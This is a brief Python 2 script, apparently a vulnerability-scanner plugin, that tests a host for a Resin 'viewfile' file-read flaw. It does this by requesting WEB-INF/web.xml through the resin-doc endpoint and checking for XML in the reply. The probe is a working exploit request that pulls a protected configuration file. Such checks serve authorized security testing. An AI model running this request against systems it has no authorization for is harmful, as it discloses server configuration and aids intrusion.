#coding:utf-8
#author:wolf@future-sec
import urllib2
def check(host,port,timeout):
    url = "http://%s:%d"%(host,int(port))
    vul_url = url + "/resin-doc/viewfile/?contextpath=/otherwebapp&servletpath=&file=WEB-INF/web.xml"
    try:
        res_html = urllib2.urlopen(vul_url,timeout=timeout).read()
    except:
        return 'NO'
    if "xml version" in res_html:
        info = vul_url + " Resin File Read Vul"
        return 'YES|'+info
    return 'NO'